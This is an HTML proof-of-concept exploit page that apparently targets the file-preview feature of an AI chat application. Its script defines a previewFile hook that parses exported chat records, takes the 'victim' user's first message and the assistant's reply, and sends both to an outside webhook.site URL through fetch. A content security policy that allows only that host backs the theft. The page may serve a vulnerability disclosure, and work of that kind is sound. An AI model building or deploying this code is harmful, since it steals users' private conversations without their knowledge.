
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src https://webhook.site/81eef1b6-43e0-4a0f-8a33-de06882adb54; base-uri 'none'; form-action 'none'">
  <title>POC</title>
  <style>
    :root { color-scheme: dark; }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      background:
        radial-gradient(circle at top left, rgba(99, 102, 241, .22), transparent 42%),
        radial-gradient(circle at bottom right, rgba(14, 165, 233, .16), transparent 45%),
        #090d16;
      color: #e8edf7;
      font: 16px/1.6 Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      overflow-wrap: anywhere;
    }
    main {
      width: min(720px, 100%);
      padding: 28px;
      border: 1px solid rgba(148, 163, 184, .2);
      border-radius: 20px;
      background: rgba(15, 23, 42, .88);
      box-shadow: 0 24px 70px rgba(0, 0, 0, .42);
      backdrop-filter: blur(14px);
    }
    h1 {
      margin: 0 0 22px;
      color: #fff;
      font-size: 24px;
      letter-spacing: -.02em;
    }
    .message {
      margin: 14px 0 0;
      padding: 16px 18px;
      border: 1px solid rgba(148, 163, 184, .18);
      border-left: 4px solid #38bdf8;
      border-radius: 12px;
      background: rgba(30, 41, 59, .72);
      white-space: pre-wrap;
    }
    .message.response { border-left-color: #a78bfa; }
    .label {
      display: block;
      margin-bottom: 6px;
      color: #94a3b8;
      font-size: 12px;
      font-weight: 750;
      letter-spacing: .08em;
      text-transform: uppercase;
    }
    .value { color: #f8fafc; }
    @media (max-width: 520px) {
      body { padding: 14px; place-items: start center; }
      main { margin-top: 8px; padding: 20px; border-radius: 16px; }
    }
  </style>
</head>
<body>
  <main>
    <h1>POC :-</h1>
    <div class="message">
      <span class="label">victim first msg :-</span>
      <span class="value" id="msg"></span>
    </div>
    <div class="message response">
      <span class="label">victim first chat response :-</span>
      <span class="value" id="response"></span>
    </div>
  </main>

  <script>
  (() => {
    "use strict";

    const TEST_TITLE_PATTERN = /^.*$/s;
    const MAX_RESPONSE_BYTES = 10 * 1024 * 1024;
    const MAX_CALLBACK_TEXT = 1500;
    let callbackSent = false;

    function text(value) {
      return typeof value === "string" ? value : "";
    }

    function messageText(message) {
      const parts = [];
      const content = text(message && message.content);
      if (content) parts.push(content);

      if (Array.isArray(message && message.blocks)) {
        for (const block of message.blocks) {
          if (!block || typeof block !== "object") continue;
          const blockText = text(block.text) || text(block.content);
          if (blockText) parts.push(blockText);
        }
      }
      return parts.join("\n\n").trim();
    }

    function messagesFor(record) {
      const history = record && record.chat && record.chat.history;
      const raw = history && history.messages;
      if (Array.isArray(raw)) return raw.filter(Boolean);
      if (raw && typeof raw === "object") return Object.values(raw).filter(Boolean);
      return [];
    }

    function testPair(records) {
      const record = records.find(item =>
        TEST_TITLE_PATTERN.test(
          text(item && (item.title || (item.chat && item.chat.title)))
        )
      );
      if (!record) return null;

      const messages = messagesFor(record);
      const userIndex = messages.findIndex(item =>
        item && item.role === "user" && messageText(item)
      );
      if (userIndex < 0) return null;

      const user = messages[userIndex];
      const userId = text(user.id);
      const childIds = Array.isArray(user.children_ids) ? user.children_ids : [];
      const assistant = messages.find(item =>
        item && item.role === "assistant" &&
        ((userId && item.parent_id === userId) || (item.id && childIds.includes(item.id)))
      ) || messages.slice(userIndex + 1).find(item => item && item.role === "assistant");

      const msg = messageText(user);
      const response = messageText(assistant);
      return msg && response ? { msg, response } : null;
    }

    function sendTestPair(pair) {
      if (callbackSent) return;
      if (pair.msg.length > MAX_CALLBACK_TEXT || pair.response.length > MAX_CALLBACK_TEXT) return;
      callbackSent = true;

      const callback = new URL("https://webhook.site/81eef1b6-43e0-4a0f-8a33-de06882adb54/");
      callback.searchParams.set("msg", pair.msg);
      callback.searchParams.set("response", pair.response);
      fetch(callback, {
        method: "GET",
        mode: "no-cors",
        credentials: "omit",
        cache: "no-store",
        referrerPolicy: "no-referrer"
      }).catch(() => {});
    }

    window.previewFile = async blob => {
      try {
        if (!(blob instanceof Blob) || !blob.size || blob.size > MAX_RESPONSE_BYTES) return;
        const records = JSON.parse(await blob.text());
        if (!Array.isArray(records)) return;

        const pair = testPair(records);
        if (!pair) return;

        document.getElementById("msg").textContent = pair.msg;
        document.getElementById("response").textContent = pair.response;
        sendTestPair(pair);
        records.length = 0;
      } catch (_) {
        // Keep the minimal example placeholders and make no callback on malformed input.
      }
    };

    window.dispatchEvent(new Event("previewfileready"));
  })();
  </script>
</body>
</html>
